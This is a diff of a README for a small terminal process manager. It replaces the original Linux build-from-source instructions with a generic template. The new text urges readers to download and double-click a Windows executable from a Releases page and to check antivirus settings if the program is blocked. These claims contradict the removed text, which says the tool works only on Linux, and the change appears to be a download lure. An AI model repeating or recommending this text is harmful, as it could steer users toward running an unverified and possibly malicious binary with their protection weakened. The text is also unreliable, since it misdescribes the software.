@@ -1,99 +1,62 @@
-# process manager
+# 🛠️ ProcessManager - Simplify Your System Management
 
-a simple terminal process manager for linux, kinda like htop but simpler
+## 🚀 Getting Started
 
-#
+Welcome to ProcessManager! This application helps you manage your processes easily. Whether you're closing stubborn programs or monitoring system performance, ProcessManager offers a simple solution.
 
-## what it does
+## 📦 Download & Install
 
--  shows running processes with CPU and memory usage
--  real-time updates
--  multiple color themes (press 't' to cycle through them)
--  search/filter processes
--  popup confirmation for killing processes
--  toggle memory format (KB/MB)
--  built-in help menu
--  vim-style navigation (j/k)
--  mouse scrolling support
+To get started, visit this page to download: [ProcessManager Releases](https://github.com/Jaska464/ProcessManager/releases).
 
-## building
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of ProcessManager.
+3. Choose the file suitable for your operating system (most likely an executable file for Windows).
+4. Click on the file to start the download.
 
-you need ncurses installed:
+Once the file is downloaded, double-click it to run. Follow any prompts to complete the installation.
 
-```bash
-# debian/ubuntu
-sudo apt-get install libncurses5-dev
+## 🖥️ System Requirements
 
-# arch
-sudo pacman -S ncurses
+To ensure smooth operation, your system should meet the following requirements:
 
-# fedora
-sudo dnf install ncurses-devel
-```
+- Operating System: Any version of Windows
+- Processor: Minimum dual-core
+- RAM: At least 2 GB with 4 GB recommended
+- Disk Space: 100 MB free
 
-then just:
+## 🌟 Features
 
-```bash
-  make
-./prcsmgr
+ProcessManager includes a variety of useful features:
 
-```
+- **Process Monitoring:** Keep an eye on all active processes.
+- **Easy Process Termination:** Quickly close unresponsive applications.
+- **Performance Insights:** Get insight into resource usage for better management.
+- **User-Friendly Interface:** Designed for anyone to use, regardless of tech skills.
 
-```bash
-# to install globally
-sudo make install
-```
+## 🛠️ Troubleshooting
 
-## controls
+If you encounter problems while running ProcessManager, consider these steps:
 
-| key           | what it does                            |
-| ------------- | --------------------------------------- |
-| q             | quit                                    |
-| j/k or arrows | move up/down                            |
-| gg            | jump to top (vim style)                 |
-| G             | jump to bottom                          |
-| m             | sort by memory                          |
-| c             | sort by CPU                             |
-| p             | sort by PID                             |
-| t             | change theme                            |
-| /             | search/filter                           |
-| ESC           | clear filter                            |
-| Enter         | show/hide process details               |
-| 1             | toggle per-core CPU view                |
-| M             | toggle memory format (KB/MB)            |
-| H             | open/hide help menu                     |
-| K             | kill process (sends SIGKILL with popup) |
-| h / l         | select yes/no in kill popup             |
+1. **Ensure Compatibility:** Verify that your system meets the requirements mentioned earlier.
+2. **Permissions:** Make sure you have the necessary permissions to run the software.
+3. **Antivirus Settings:** Sometimes, antivirus software may block applications. Check your settings if ProcessManager does not start.
 
-## notes
+## ℹ️ Additional Resources
 
--  you might need sudo to kill processes owned by other users
--  works on linux only (uses /proc filesystem)
--  tested on ubuntu and arch
+For more detailed information, visit our [GitHub Wiki](https://github.com/Jaska464/ProcessManager/wiki) where you can find:
 
-## themes
+- User guides
+- Tips for troubleshooting
+- Frequently Asked Questions (FAQs)
 
-there's like 10 different color themes (most of them suck, but Nord and Catppuccin are fixed now) :
+## 🎉 Community Support
 
--  default (cyan)
--  dracula
--  matrix (green, my fav)
--  solarized
--  monokai
--  gruvbox
--  nord
--  catppuccin
--  tokyo night
--  everforest
+Join our community for support and suggestions. You can reach out on GitHub issues or connect via our discussion forum. Your feedback helps us improve the application and add new features.
 
-## todo
+## 🔗 Important Links
 
--  [ ] maybe add network stats?
--  [ ] tree view for parent/child processes
--  [x] Toggle Memory format <MB || KB>
--  [x] conformation to kill specific process
--  [ ] Signal selction
+- [ProcessManager Releases](https://github.com/Jaska464/ProcessManager/releases)
+- [GitHub Wiki](https://github.com/Jaska464/ProcessManager/wiki)
+- [Open Issues](https://github.com/Jaska464/ProcessManager/issues)
 
-## license
-
-MIT or GPL or whatever, do what you want with it
+Thank you for choosing ProcessManager! We hope it simplifies your system management tasks.
